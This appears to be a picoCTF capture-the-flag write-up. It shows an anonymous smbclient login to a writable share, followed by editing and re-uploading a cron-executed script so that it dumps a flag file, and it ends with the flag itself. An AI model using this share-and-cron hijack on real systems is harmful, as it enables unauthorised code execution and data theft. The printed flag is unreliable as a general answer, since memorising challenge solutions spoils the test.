
![](attachments/General%20Skills-24.png)
#### Hints

1. a suspicious script is running every minute
2. this script runs every minute, you might need to wait for a while

```
smbclient -L //dolphin-cove.picoctf.net -p 62671
```

![](attachments/General%20Skills-25.png)

```
smbclient //dolphin-cove.picoctf.net/shares -p 62671 -N
Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Fri Mar 13 14:37:01 2026
  ..                                  D        0  Fri Mar 13 14:37:01 2026
  script.sh                           N       73  Thu Feb  5 02:52:17 2026
  cron.log                            N      172  Fri Mar 13 14:40:02 2026

		65536 blocks of size 1024. 57340 blocks available
smb: \> get script.sh 
getting file \script.sh of size 73 as script.sh (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get cron.log 
getting file \cron.log of size 172 as cron.log (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)

```

```
cat script.sh 
#!/bin/bash
echo "Health Check: $(date)"
ls / >> cron.log
ls /secure-shares >> cron.log
cat /secure-shares/flag.txt >> cron.log

```

```
cat cron.log 
Health Check: Fri Mar 13 09:07:01 UTC 2026
Health Check: Fri Mar 13 09:08:01 UTC 2026
Health Check: Fri Mar 13 09:09:01 UTC 2026
```

nano script.sh
```
#!/bin/bash
echo "Health Check: $(date)"
ls -la /challenge/secure-shares >> cron.log
cat /challenge/secure-shares/flag.txt >> cron.log
cat /challenge/secure-shares/flag >> cron.log
```
```
smb: \> put script.sh 
smb: \> get cron.log 
```

```
picoCTF{5mb_pr1nter_5h4re5_r3v3r53_073f28ac}
```

---
